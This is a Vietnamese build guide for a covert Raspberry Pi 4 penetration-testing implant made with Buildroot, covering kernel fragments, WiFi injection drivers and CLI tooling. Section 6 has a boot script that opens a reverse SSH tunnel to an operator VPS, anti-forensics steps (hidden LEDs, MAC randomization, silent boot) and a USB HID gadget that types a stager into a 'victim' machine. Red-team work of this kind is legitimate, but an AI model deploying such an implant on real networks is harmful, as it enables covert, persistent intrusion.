# 01 - Build custom kernel + rootfs cho Pi 4 implant (Buildroot)

> Authorized testing only.

Combo: **Buildroot from-scratch + headless stealth implant + all-purpose CLI**.
Buildroot quản lý kernel + rootfs cùng một chỗ, reproducible, version-controlled,
nên "custom sâu đến kernel" rất sạch: không sửa `.config` thủ công mà dùng
**config fragment**. (Yacto nặng/chậm hơn nhiều, không cần cho một implant.)

## 0. Giải quyết mâu thuẫn "all-purpose" vs "implant from-scratch"

Buildroot thuần không kéo nổi nguyên kho Kali (metasploit, burp, GUI...). Nhưng
với một implant headless thì đó lại là điều mình muốn:

- Trên Pi: kernel custom + core CLI tooling (nmap, tcpdump, aircrack-ng, iw,
  scapy/impacket/pwntools qua Python) + reverse C2.
- Đồ nặng (metasploit, burp, bloodhound) chạy trên **máy operator**, Pi chỉ là
  relay/agent qua tunnel.

Đó là mô hình drop-box chuẩn. Nếu sau này thiếu, đi **hybrid**: kernel Buildroot
+ rootfs Debian/Kali (debootstrap).

## 1. Setup build host + Buildroot

Trên máy build (Linux x86_64, KHÔNG phải Pi):

```bash
sudo apt install -y build-essential git bc bison flex libssl-dev \
  libncurses-dev rsync wget cpio unzip file python3 device-tree-compiler

git clone https://git.buildroot.net/buildroot
cd buildroot
git checkout 2024.02.x          # branch LTS on dinh

# Pi 4 64-bit lam diem xuat phat
make raspberrypi4_64_defconfig
```

`raspberrypi4_64_defconfig` đã trỏ sẵn kernel vào fork `raspberrypi/linux` (có
device tree Pi, brcmfmac cho WiFi onboard, dwc2). Đúng cái ta cần.

## 2. CUSTOM KERNEL - phần chính

Buildroot dùng kernel defconfig `bcm2711` + **fragment files** chồng lên. Mọi
tùy biến hacking nằm gọn trong một file fragment.

### 2.1 Tạo fragment

Đặt tại `board/pi4-implant/linux.fragment` (xem file đầy đủ:
[linux.fragment](linux.fragment)). Các nhóm chính:

- USB Gadget (BadUSB / HID / USB-Ethernet / mass storage): `dwc2`, `libcomposite`,
  configfs HID/ECM/RNDIS/mass-storage/ACM.
- WiFi mac80211 stack + onboard `brcmfmac` + driver adapter ngoài (`rtl8xxxu`,
  `ath9k_htc`, `rt2800usb`, `carl9170`, `rtl8187`).
- Netfilter / sniffing / tunnel: iptables, NAT, NFLOG, raw packet, TUN, WireGuard.
- Bluetooth / BLE: BT, LE, RFCOMM, BNEP, HIDP, HCIBTUSB.
- Hardware buses: I2C/SPI chardev, USB-serial (FTDI/CP210x/PL2303/CH341), CAN
  (MCP251x), USB ACM.
- Storage forensics: USB storage, NTFS3, exFAT.
- Stealth: OverlayFS, namespaces, squashfs, tắt MAGIC_SYSRQ.

### 2.2 Trỏ Buildroot vào fragment

```bash
make menuconfig
# Kernel -> Kernel configuration -> Using a defconfig (= bcm2711)
# Kernel -> Additional configuration fragment files ->
#           board/pi4-implant/linux.fragment
```

Hoặc sửa thẳng `.config` của Buildroot:

```text
BR2_LINUX_KERNEL_CONFIG_FRAGMENT_FILES="board/pi4-implant/linux.fragment"
```

Rebuild riêng kernel để soi nhanh:

```bash
make linux-reconfigure   # ap lai defconfig + fragment
make linux-rebuild       # compile lai kernel + modules
```

Verify fragment đã ăn:

```bash
grep -E "DWC2|BRCMFMAC|CONFIGFS_F_HID" output/build/linux-*/.config
```

Muốn dò tên symbol thì `make linux-menuconfig` (search bằng `/`), tìm xong copy
symbol vào fragment. ĐỪNG chỉ lưu trong menuconfig vì sẽ mất khi reconfigure.

### 2.3 Device tree cho USB gadget

Gadget mode cần overlay `dwc2`. Copy `config.txt`/`cmdline.txt` ra board riêng:

`config.txt`:
```text
dtoverlay=dwc2,dr_mode=otg
```

`cmdline.txt` (nối cuối, cùng dòng):
```text
modules-load=dwc2
```

Nạp sẵn module lúc boot bằng overlay `rootfs-overlay/etc/modules-load.d/gadget.conf`:
```text
dwc2
libcomposite
```

## 3. Nexmon - monitor mode + injection cho WiFi onboard

Nexmon patch **firmware blob** `brcmfmac43455-sdio.bin` (không phải kernel) cho
chip BCM43455c0, mở monitor mode + frame injection.

Dễ nhất: build trên một con Pi rồi lấy artifact:
- `brcmfmac43455-sdio.bin` (firmware đã patch)
- `nexutil` (binary bật monitor mode)
- đôi khi cả `brcmfmac.ko` patched

Nhét vào rootfs overlay:

```text
board/pi4-implant/rootfs-overlay/
  lib/firmware/brcm/brcmfmac43455-sdio.bin
  usr/bin/nexutil
```

```text
BR2_ROOTFS_OVERLAY="board/pi4-implant/rootfs-overlay"
```

Runtime:
```bash
nexutil -m2
iw dev wlan0 interface add mon0 type monitor
```

> Nexmon trên kernel 6.x / 64-bit hơi kén. Đường an toàn hơn cho injection:
> adapter ngoài (mục 4), hoặc AR9271 (ath9k_htc) cắm-là-chạy.

## 4. Driver adapter ngoài (injection ngon nhất)

- Alfa AWUS036ACH (RTL8812AU): driver out-of-tree. Buildroot có sẵn vài package
  Realtek (`rtl8188eu`, `rtl8821au`, `rtl8812au`... tùy version) trong
  `Target packages -> Hardware handling`. Nếu thiếu, viết custom package trong
  BR2_EXTERNAL trỏ repo `morrownr/8812au-20210820` -> build thành `.ko` ngay
  trong Buildroot (không cần DKMS runtime, hợp image read-only).
- Adapter "an toàn" in-tree: AR9271 (`ath9k_htc`, đã bật) - monitor + injection
  ngay.

## 5. Tooling layer (all-purpose, bản CLI)

`make menuconfig -> Target packages`:

- Networking: nmap, tcpdump, aircrack-ng, hostapd, dnsmasq, iw, wireless-tools,
  wpa_supplicant, iperf3, tcpreplay, openssh, dropbear, mtr, socat, netcat,
  wireguard-tools, openvpn, nftables/iptables.
- Interpreter: python3 -> pip install scapy impacket pwntools (qua overlay hoặc
  cài post-boot).
- Vận hành: tmux, vim, htop, e2fsprogs, util-linux.

Heavy framework (metasploit/burp/sqlmap) để máy operator, Pi forward qua tunnel.

## 6. Headless stealth implant

### 6.1 Phone-home reverse tunnel

WireGuard sạch và bền hơn autossh. Overlay một service init.

`rootfs-overlay/etc/init.d/S99callhome` (BusyBox init):
```sh
#!/bin/sh
case "$1" in
  start)
    wg-quick up wg0
    # backup: autossh reverse SSH neu WG chet
    autossh -M 0 -f -N -R 2222:localhost:22 operator@VPS_IP \
       -o "ServerAliveInterval 30" -o "ExitOnForwardFailure yes"
    ;;
esac
```

Operator: `ssh -p 2222 root@localhost` (qua VPS) hoặc thẳng qua WireGuard IP.

### 6.2 Stealth / anti-forensics

- Read-only root + overlayfs: rootfs squashfs read-only, `/var`+`/etc` ghi lên
  tmpfs overlay -> mất điện không hỏng FS, không để dấu ghi đĩa.
- MAC randomization mỗi boot (`iw`/`macchanger`/script).
- Hostname/banner trung tính; tắt LED (`config.txt`: `dtparam=act_led_trigger=none`
  + `act_led_activelow=on`); tắt MOTD.
- SSH key-only, đổi port.
- Tắt MAGIC_SYSRQ (đã làm trong fragment); giảm verbosity boot
  (`cmdline.txt`: `quiet loglevel=0`).

### 6.3 USB gadget khi cắm vào host nạn nhân

Cắm Pi (USB-C) vào máy target -> dựng composite gadget: vừa HID keyboard (gõ
payload) vừa USB-Ethernet (RNDIS/ECM -> route vào máy đó). HID gõ stager, ECM cho
NIC ảo để pivot. Mô hình P4wnP1 nhưng trên kernel tự build.

## 7. Build & flash

```bash
make -j$(nproc)
# Output: output/images/sdcard.img
sudo dd if=output/images/sdcard.img of=/dev/sdX bs=4M conv=fsync status=progress
```

Vòng lặp dev nhanh khi chỉ sửa kernel:
```bash
make linux-rebuild && make   # repack image
```

## 8. Reproducible - đóng thành BR2_EXTERNAL

```bash
make savedefconfig            # luu Buildroot defconfig
make linux-update-defconfig   # neu dung custom kernel config
```

Cấu trúc:
```text
pi4-implant/                 # BR2_EXTERNAL
  external.mk  external.desc  Config.in
  configs/pi4_implant_defconfig
  board/pi4-implant/
    linux.fragment
    config.txt  cmdline.txt
    rootfs-overlay/
    post-image.sh
  package/                   # custom: rtl8812au, nexmon-firmware...
```

Dùng: `make BR2_EXTERNAL=../pi4-implant pi4_implant_defconfig`.
